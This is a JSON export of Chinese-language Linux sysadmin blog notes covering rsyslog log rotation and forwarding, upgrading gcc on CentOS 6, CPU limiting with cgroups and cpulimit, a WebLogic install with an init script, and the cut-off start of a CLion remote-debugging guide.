[{"title":"【note】rsyslog配置","url":"http://www.beesfun.com/2018/08/10/【note】rsyslog配置/","content":"<p>Linux日志机制的核心是rsyslog守护进程，该服务负责监听Linux下的日志信息，并把日志信息追加到对应的日志文件中，一般在/var/log目录下。它还可以把日志信息通过网络协议发送到另一台Linux服务器上。<br><a id=\"more\"></a></p>\n<h2 id=\"配置文件\"><a href=\"#配置文件\" class=\"headerlink\" title=\"配置文件\"></a>配置文件</h2><p>rsyslog的配置文件为/etc/rsyslog.conf和/etc/rsyslog.d/*.conf。</p>\n<h3 id=\"服务器上存储的日志文件可以按天进行存储\"><a href=\"#服务器上存储的日志文件可以按天进行存储\" class=\"headerlink\" title=\"服务器上存储的日志文件可以按天进行存储\"></a>服务器上存储的日志文件可以按天进行存储</h3><p>示例配置如下：</p>\n<ul>\n<li>/etc/rsyslog.d/work.conf</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span> Create dynamic file template</span><br><span class=\"line\"><span class=\"meta\">$</span>template DynLogs,\"/var/log/app/%PROGRAMNAME%_%$YEAR%-%$MONTH%-%$DAY%.log\"</span><br><span class=\"line\"><span class=\"meta\">#</span> save localhost</span><br><span class=\"line\">local5.alert  ?DynLogs</span><br></pre></td></tr></table></figure>\n<p>rsyslog 接收local5程序alert及其以上事件的日志，存放在/var/log/app路径，通过年月日命名文件的方式实现按日期存储日志。</p>\n<h3 id=\"指定日志信息格式\"><a href=\"#指定日志信息格式\" class=\"headerlink\" title=\"指定日志信息格式\"></a>指定日志信息格式</h3><p>配置示例如下：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span> Create dynamic file template</span><br><span class=\"line\"><span class=\"meta\">$</span>template DynLogs,\"/var/log/app/%PROGRAMNAME%_%$YEAR%-%$MONTH%-%$DAY%.log\" *</span><br><span class=\"line\"><span class=\"meta\">$</span>template GRAYLOGRFC5424,\"&lt;%PRI%&gt;%PROTOCOL-VERSION% %TIMESTAMP:::date-rfc3339% %HOSTNAME% %APP-NAME% %PROCID% %MSGID% %STRUCTURED-DATA% %msg%\\n\"</span><br><span class=\"line\"><span class=\"meta\">#</span> save localhost</span><br><span class=\"line\">local5.alert  ?DynLogs;GRAYLOGRFC5424</span><br></pre></td></tr></table></figure>\n<h3 id=\"转发到远程服务器\"><a href=\"#转发到远程服务器\" class=\"headerlink\" title=\"转发到远程服务器\"></a>转发到远程服务器</h3><p>配置示例如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># forwarding ymon log to remote server</span><br><span class=\"line\">$WorkDirectory /var/lib/rsyslog # where to place spool files</span><br><span class=\"line\">$ActionQueueFileName fwdWORK # unique name prefix for spool files</span><br><span class=\"line\">$ActionQueueMaxDiskSpace 4g   # 1gb space limit (use as much as possible)</span><br><span class=\"line\">$ActionQueueSaveOnShutdown on # save messages to disk on shutdown</span><br><span class=\"line\">$ActionQueueType LinkedList   # run asynchronously</span><br><span class=\"line\">$ActionResumeRetryCount -1    # infinite retries if host is down</span><br><span class=\"line\">local5.alert @@172.16.40.12:514</span><br><span class=\"line\"></span><br><span class=\"line\">&amp; ~</span><br></pre></td></tr></table></figure>\n<p>远程服务器rsyslog配置,同样设置按天进行存储</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span>### MODULES #### </span><br><span class=\"line\"><span class=\"meta\">#</span> Provides TCP syslog reception</span><br><span class=\"line\"><span class=\"meta\">$</span>ModLoad imtcp</span><br><span class=\"line\"><span class=\"meta\">$</span>InputTCPServerRun 514</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#</span>$AllowedSender tcp, 10.6.1.0/24</span><br><span class=\"line\"><span class=\"meta\">$</span>template RemoteLogs,\"/var/log/%HOSTNAME%/%PROGRAMNAME%_%$YEAR%-%$MONTH%-%$DAY%.log\" *</span><br><span class=\"line\">local5.alert  ?RemoteLogs</span><br><span class=\"line\">&amp; ~</span><br></pre></td></tr></table></figure>\n<p>若开启防火墙，则需配置</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vim /etc/sysconfig/iptables </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#</span> ssh 配置行下添加一行 ssh: -A INPUT -p tcp -m state --state NEW -m tcp --dport 22 -j ACCEPT</span><br><span class=\"line\">-A INPUT -p tcp -m state --state NEW -m tcp --dport 514 -j ACCEPT</span><br><span class=\"line\"></span><br><span class=\"line\">service iptables restart</span><br></pre></td></tr></table></figure>","categories":["note"],"tags":["linux"]},{"title":"【note】centos6 升级gcc和g++","url":"http://www.beesfun.com/2018/08/03/【note】centos6-升级gcc和g/","content":"<p>对 gcc或g++ 升级无法直接使用：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yum update gcc</span><br></pre></td></tr></table></figure>\n<p>以下是升级的详细过程。</p>\n<h3 id=\"1-使用-redhat-developer-toolset-2-的repo，安装GCC\"><a href=\"#1-使用-redhat-developer-toolset-2-的repo，安装GCC\" class=\"headerlink\" title=\"1.使用 redhat developer toolset 2 的repo，安装GCC\"></a>1.使用 redhat developer toolset 2 的repo，安装GCC</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cd /etc/yum.repos.d</span><br><span class=\"line\">wget https://people.centos.org/tru/devtools-2/devtools-2.repo</span><br><span class=\"line\">yum --enablerepo=testing-2-devtools-6 install devtoolset-2-gcc devtoolset-2-gcc-c++</span><br></pre></td></tr></table></figure>\n<a id=\"more\"></a>\n<h3 id=\"2-替换系统中原来的GCC\"><a href=\"#2-替换系统中原来的GCC\" class=\"headerlink\" title=\"2. 替换系统中原来的GCC\"></a>2. 替换系统中原来的GCC</h3><p>通过通过第一步会把 GCC 安装到以下目录：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/opt/rh/devtoolset-2/root/usr/bin/</span><br></pre></td></tr></table></figure>\n<p>接下来需要修改系统的配置，使默认的 gcc 和 g++ 命令使用的是新安装的版本。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ln -s /opt/rh/devtoolset-2/root/usr/bin/* /usr/local/bin/</span><br><span class=\"line\">hash -r</span><br></pre></td></tr></table></figure>\n<p>现在查看 g++ 的版本号：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">g++ --version</span><br><span class=\"line\">g++ (GCC) 4.8.2 20140120 (Red Hat 4.8.2-15)</span><br><span class=\"line\">Copyright (C) 2013 Free Software Foundation, Inc.</span><br><span class=\"line\">This is free software; see the source for copying conditions.  There is NO</span><br><span class=\"line\">warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.</span><br></pre></td></tr></table></figure>\n<p>g++版本升级到4.8.2了。</p>\n<h3 id=\"3-副作用\"><a href=\"#3-副作用\" class=\"headerlink\" title=\"3. 副作用\"></a>3. 副作用</h3><p>gcc 4.8生成“rep;ret”指令，避免AMD芯片的性能损失，而老版的assemblers会识别为错误，<br>解决方法是更新binutils，使用更新的assemblers接受此指令。参考：<a href=\"https://gcc.gnu.org/ml/gcc-help/2011-03/msg00286.html\" target=\"_blank\" rel=\"noopener\">https://gcc.gnu.org/ml/gcc-help/2011-03/msg00286.html</a></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yum install -y devtoolset-2-binutils-devel</span><br></pre></td></tr></table></figure>\n<h2 id=\"更优雅的方式\"><a href=\"#更优雅的方式\" class=\"headerlink\" title=\"更优雅的方式\"></a>更优雅的方式</h2><p>centos为了稳定性，发行版的软件版本通常都比较低，为了解决用户使用软件不同版本的需求，RedHat 推出 Software Collections，更多说明可自行谷歌。</p>\n<p>解决上述更新gcc版本，可以使用 <code>devtoolset + scl</code>, devtoolset不同的版本内置了不同版本的gcc等多个软件包，devtoolset-3使用的是gcc4.9.2的版本。</p>\n<p>安装scl支持: <code>yum install scl-utils</code></p>\n<p>例如在bash命令中更新使用的gcc，如<code>scl enable devtoolset-3 bash</code>, 这点和python的venv很类似。如果只是一次性使用，可以使用以下命令：<code>scl enable devtoolset-3 &quot;gcc --version&quot;</code></p>\n","categories":["note"],"tags":["linux"]},{"title":"【note】linux上限制进程cpu占用率","url":"http://www.beesfun.com/2018/07/30/【note】linux上限制进程cpu占用率/","content":"<p>linux上限制进程cpu占用率，可以使用cgroups或者cpulimit，这两种方式经实践能有效限制cpu的占用。cgroups现已集成到大多数linux中，简单配置即可实现各种\b对进程资源的配置，优先推荐使用该方式，系统资源消耗少，且稳定可靠，配置方式灵活。cpulimit是一个开源工具，github地址为 <a href=\"https://github.com/opsengine/cpulimit\" target=\"_blank\" rel=\"noopener\">https://github.com/opsengine/cpulimit</a>。cpulimit利用信号机制暂停和恢复进程的运行，\b\b并不直接操作内核。</p>\n<a id=\"more\"></a>\n<h2 id=\"cgroups\"><a href=\"#cgroups\" class=\"headerlink\" title=\"cgroups\"></a>cgroups</h2><p>cgroups 目的是对进程进行资源管理,涉及以下概念：</p>\n<ul>\n<li>task：任务，对应于系统中运行的一个实体，一般是指进程</li>\n<li>subsystem：子系统，具体的资源控制器（resource class 或者 resource controller），控制某个特定的资源使用。比如 CPU 子系统可以控制 CPU 时间，memory 子系统可以控制内存使用量</li>\n<li>cgroup：控制组，一组任务和子系统的关联关系，表示对这些任务进行怎样的资源管理策略</li>\n<li>hierarchy：层级树，一系列 cgroup 组成的树形结构。每个节点都是一个 cgroup，cgroup 可以有多个子节点，子节点默认会继承父节点的属性。系统中可以有多个 hierarchy</li>\n</ul>\n<p>更多介绍参考: <a href=\"https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/6/html/resource_management_guide/ch01\" target=\"_blank\" rel=\"noopener\">redhat CGROUPS</a></p>\n<p>以下使用实例方式，介绍使用cgroups\b区分用户限制进程对cpu的占用率。</p>\n<ul>\n<li>系统：centos 6.5 </li>\n<li>cpu数：2</li>\n<li>目标<ul>\n<li>test 用户进程cpu 100% （单cpu)</li>\n<li>其他任意用户进程cpu 60% (单cpu)</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"新建test用户\"><a href=\"#新建test用户\" class=\"headerlink\" title=\"新建test用户\"></a>新建test用户</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/usr/sbin/adduser test</span><br><span class=\"line\">passwd test</span><br><span class=\"line\"></span><br><span class=\"line\"># test用户赋予sudo权限</span><br><span class=\"line\">/usr/sbin/visudo</span><br><span class=\"line\"></span><br><span class=\"line\"># User privilege specification</span><br><span class=\"line\">root    ALL=(ALL)       ALL</span><br><span class=\"line\">test   ALL=(ALL)       ALL</span><br></pre></td></tr></table></figure>\n<h3 id=\"配置cgroups\"><a href=\"#配置cgroups\" class=\"headerlink\" title=\"配置cgroups\"></a>配置cgroups</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yum install -y libcgroup</span><br><span class=\"line\">service cgconfig start</span><br><span class=\"line\"></span><br><span class=\"line\"># 查看子系统</span><br><span class=\"line\">ls /cgroup</span><br><span class=\"line\">blkio  cpu  cpuacct  cpuset  devices  freezer  memory  net_cls</span><br><span class=\"line\"></span><br><span class=\"line\">lscgroup</span><br><span class=\"line\">cpuset:/</span><br><span class=\"line\">cpu:/</span><br><span class=\"line\">cpuacct:/</span><br><span class=\"line\">memory:/</span><br><span class=\"line\">devices:/</span><br><span class=\"line\">freezer:/</span><br><span class=\"line\">net_cls:/</span><br><span class=\"line\">blkio:/</span><br></pre></td></tr></table></figure>\n<ul>\n<li>配置cgconfig</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vim /etc/cgconfig.conf</span><br><span class=\"line\"></span><br><span class=\"line\"># append</span><br><span class=\"line\">group limitcpu &#123;</span><br><span class=\"line\">\tcpu &#123;</span><br><span class=\"line\">\t\tcpu.cfs_quota_us = 6000;</span><br><span class=\"line\">\t\tcpu.cfs_period_us = 10000;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">group user &#123;</span><br><span class=\"line\">\tcpu &#123;</span><br><span class=\"line\">\t\tcpu.cfs_quota_us = 10000;</span><br><span class=\"line\">\t\tcpu.cfs_period_us = 10000;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>配置cgrules</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vim /etc/cgrules.conf</span><br><span class=\"line\"></span><br><span class=\"line\"># append</span><br><span class=\"line\">test    cpu    user/</span><br><span class=\"line\">*       cpu    limitcpu/</span><br></pre></td></tr></table></figure>\n<ul>\n<li>服务启动和自启</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">service cgconfig restart</span><br><span class=\"line\">chkconfig cgconfig on</span><br><span class=\"line\">service cgred start</span><br><span class=\"line\">chkconfig cgred on</span><br></pre></td></tr></table></figure>\n<h2 id=\"cpulimit\"><a href=\"#cpulimit\" class=\"headerlink\" title=\"cpulimit\"></a>cpulimit</h2><p>从github下载源码，make编译，会在src目录生成可执行程序cpulimit.</p>\n<p>对进程\b xxx (pid:1234)限制cpu占用率为 30%，可以使用以下命令</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">./cpulimit -p 1234 -l 30</span><br><span class=\"line\">./cpulimit -e xxx -l 30</span><br></pre></td></tr></table></figure>\n<p>cpulimit\b原理比较简单，计算进程cpu的占用时间，然后调用<code>kill(pid,SIGSTOP)</code>和<code>kill(pid,SIGCONT)</code>来暂停和恢复进程，在此期间调用<code>nanosleep</code>后台挂起，避免\bcpulimit过多占用cpu时间。</p>\n<h2 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h2><ul>\n<li><a href=\"https://www.kernel.org/doc/Documentation/cgroup-v1/cgroups.txt\" target=\"_blank\" rel=\"noopener\">Linux 内核 cgroups 简介</a></li>\n<li><a href=\"https://www.digitalocean.com/community/tutorials/how-to-limit-resources-using-cgroups-on-centos-6\" target=\"_blank\" rel=\"noopener\">How To Limit Resources Using cgroups on CentOS 6</a></li>\n</ul>\n","categories":["note"],"tags":["linux"]},{"title":"【note】centos6.5安装weblogic","url":"http://www.beesfun.com/2018/07/22/【note】centos6-5安装weblogic/","content":"<h2 id=\"下载bin安装包\"><a href=\"#下载bin安装包\" class=\"headerlink\" title=\"下载bin安装包\"></a>下载bin安装包</h2><p>weblogic 10.3.6 linux可执行文件下载地址</p>\n<ul>\n<li><a href=\"http://download.oracle.com/otn/linux/middleware/11g/wls/1036/wls1036_linux32.bin\" target=\"_blank\" rel=\"noopener\">http://download.oracle.com/otn/linux/middleware/11g/wls/1036/wls1036_linux32.bin</a><a id=\"more\"></a>\n</li>\n</ul>\n<h2 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h2><p>首先建立weblogic用户</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">groupadd -g 900 weblogic</span><br><span class=\"line\">useradd -u 900 -g weblogic weblogic</span><br><span class=\"line\">mkdir /usr/local/weblogic</span><br><span class=\"line\">chown -R weblogic.weblogic /usr/local/weblogic/</span><br><span class=\"line\">yum install -y glibc.i686 libstdc++.so.6</span><br></pre></td></tr></table></figure>\n<ul>\n<li>将本地主机名解析为127.0.0.1</li>\n</ul>\n<p>否则会出现Weblogic：Could not obtain the localhost address问题</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">echo &quot;127.0.0.1 $(hostname)&quot; &gt;&gt; /etc/hosts</span><br><span class=\"line\"></span><br><span class=\"line\"># 安装操作都以weblogic用户进行</span><br><span class=\"line\">su - weblogic</span><br></pre></td></tr></table></figure>\n<ul>\n<li>安装weblogic</li>\n</ul>\n<p>参考: <a href=\"http://blog.51cto.com/linux10000/1957635\" target=\"_blank\" rel=\"noopener\">CentOS 6通过bin安装包安装Weblogic</a></p>\n<p>安装路径为: /usr/local/weblogic</p>\n<ul>\n<li>免密启动</li>\n</ul>\n<p>安装完后先运行startWebLogic.sh脚本，会在base_domin目录下生成servers目录，然后设置免密登陆，假设用户名为weblogic, 密码为weblogic123</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cd /usr/local/weblogic/user_projects/domains/base_domain/servers/AdminServer/</span><br><span class=\"line\">mkdir security</span><br><span class=\"line\">vim security/boot.properties</span><br><span class=\"line\">\tusername=weblogic</span><br><span class=\"line\">\tpassword=weblogic123</span><br></pre></td></tr></table></figure>\n<p>重启weblogic</p>\n<ul>\n<li>设置自启动</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span> 设置日志文件路径</span><br><span class=\"line\">touch /var/log/weblogic.log</span><br><span class=\"line\">chown weblogic:weblogic /var/log/weblogic.log</span><br><span class=\"line\">vim /etc/init.d/weblogic</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span>!/bin/bash</span><br><span class=\"line\"><span class=\"meta\">#</span>chkconfig:35 99 05</span><br><span class=\"line\"><span class=\"meta\">#</span>description:Weblogic Server</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#</span>/ect/init.d/weblogic</span><br><span class=\"line\"><span class=\"meta\">#</span>Please edit the Variable</span><br><span class=\"line\">export WLS_HOME=/usr/local/weblogic/user_projects/domains/base_domain</span><br><span class=\"line\">export WLS_LOG=/var/log/weblogic.log</span><br><span class=\"line\">export PATH=$PATH:$WLS_HOME/bin</span><br><span class=\"line\">WLS_OWNER=\"weblogic\"</span><br><span class=\"line\"></span><br><span class=\"line\">if [ ! -f$WLS_HOME/bin/startWebLogic.sh -o ! -d $WLS_HOME ]</span><br><span class=\"line\">then</span><br><span class=\"line\">    echo \"WebLogic startup:cannot start\"</span><br><span class=\"line\">    exit 1</span><br><span class=\"line\">fi</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#</span> depending on parameter -- startup,shutdown,restart</span><br><span class=\"line\">case \"$1\" in</span><br><span class=\"line\">start)</span><br><span class=\"line\">    echo -n \"Starting Weblogic:log file $WLS_LOG\"</span><br><span class=\"line\">    touch /var/lock/weblogic</span><br><span class=\"line\">    su - $WLS_OWNER -c \"nohup sh $WLS_HOME/bin/startWebLogic.sh &gt; $WLS_LOG 2&gt;$1 &amp;\"</span><br><span class=\"line\">    echo \" OK\"</span><br><span class=\"line\">    ;;</span><br><span class=\"line\">stop)</span><br><span class=\"line\">    echo -n \"Shutdown Weblogic:\"</span><br><span class=\"line\">    rm -rf /var/lock/weblogic</span><br><span class=\"line\">su - $WLS_OWNER -c \"sh $WLS_HOME/bin/stopWebLogic.sh &gt;&gt; $WLS_LOG\"</span><br><span class=\"line\"><span class=\"meta\">#</span> killall -9 java</span><br><span class=\"line\">    echo \" OK\"</span><br><span class=\"line\">    ;;</span><br><span class=\"line\">reload|restart)</span><br><span class=\"line\">    $0 stop</span><br><span class=\"line\">    $0 start</span><br><span class=\"line\">    ;;</span><br><span class=\"line\">*)</span><br><span class=\"line\">    echo \"Usage: `basename $0` start|stop|restart|reload\"</span><br><span class=\"line\">    exit 1</span><br><span class=\"line\">esac</span><br><span class=\"line\">exit 0</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">chmod a+x/etc/init.d/weblogic</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#</span> 测试服务方式启动</span><br><span class=\"line\">service weblogic start</span><br><span class=\"line\"><span class=\"meta\">#</span> 配置服务自启动</span><br><span class=\"line\">chkconfig weblogic on</span><br></pre></td></tr></table></figure>\n<h2 id=\"踩过的坑\"><a href=\"#踩过的坑\" class=\"headerlink\" title=\"踩过的坑\"></a>踩过的坑</h2><p>编写服务文件，调用weblogic启动脚本要放到后台执行，否则会阻塞之后的服务启动，比如ssh服务。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span> 错误的方式，服务调用放在前台执行</span><br><span class=\"line\">su - $&#123;WLS_OWNER&#125; -c \"cd $&#123;WLS_HOME&#125;; ./startWebLogic.sh\"</span><br><span class=\"line\"><span class=\"meta\">#</span> 正确的方式，服务调用放在后台执行</span><br><span class=\"line\">su - $&#123;WLS_OWNER&#125; -c \"cd $&#123;WLS_HOME&#125;; ./startWebLogic.sh &amp;\"</span><br></pre></td></tr></table></figure>","categories":["note"],"tags":[]},{"title":"【note】clion远程调试","url":"http://www.beesfun.com/2018/07/19/【note】clion远程调试/","content":"<p>mac上使用CLION远程调试centos上的C或C++可执行程序，clion使用GDB Remote Debug进行配置。</p>\n<ul>\n<li>宿主机： OSX 10.13.6</li>\n<li>虚拟机：CentOS 6.5 x64</li>\n</ul>\n<h2 id=\"虚拟机基本配置\"><a href=\"#虚拟机基本配置\" class=\"headerlink\" title=\"虚拟机基本配置\"></a>虚拟机基本配置</h2><p>首先在CentOS上安装必备的软件，包括 gcc, gcc-c++, gdb gdbserver, cmake, make。其中gcc-c++是用来编译cpp, cmake是由于clion使用cmake进行构建，因此CentOS上也要使用cmake来进行构建，保证本地和虚拟机的文件一致，在clion上使用GDB Remote Debug 进行远程调试。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yum install -y gcc gcc-c++ make cmake gdb gdb-gdbserve</span><br></pre></td></tr></table></figure>\n<a id=\"more\"></a>\n<h3 id=\"cmake-构建\"><a href=\"#cmake-构建\" class=\"headerlink\" title=\"cmake 构建\"></a>cmake 构建</h3><p>假设代码的根目录：/root/work/hello， 源代码为单文件main.cpp</p>\n<p>项目目录下编写CMakeLists.txt文件</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># Make 最低版本号要求</span><br><span class=\"line\">cmake_minimum_required(VERSION 2.8)</span><br><span class=\"line\"></span><br><span class=\"line\"># 项目信息</span><br><span class=\"line\">project(hello)</span><br><span class=\"line\"></span><br><span class=\"line\"># 指定源文件</span><br><span class=\"line\">set(SOURCE_FILES main.cpp)</span><br><span class=\"line\"></span><br><span class=\"line\">set(CMAKE_SOURCE_DIR .)</span><br><span class=\"line\"></span><br><span class=\"line\"># 配置gdb调试</span><br><span class=\"line\">set(CMAKE_BUILD_TYPE &quot;Debug&quot;)</span><br><span class=\"line\">set(CMAKE_CXX_FLAGS_DEBUG &quot;$ENV&#123;CXXFLAGS&#125; -O0 -Wall -g3 -ggdb&quot;)</span><br><span class=\"line\">set(CMAKE_CXX_FLAGS_RELEASE &quot;$ENV&#123;CXXFLAGS&#125; -O3 -Wall&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\"># 指定生成目标</span><br><span class=\"line\">add_executable(hello $&#123;SOURCE_FILES&#125;)</span><br></pre></td></tr></table></figure>\n<p>使用cmake构建</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td 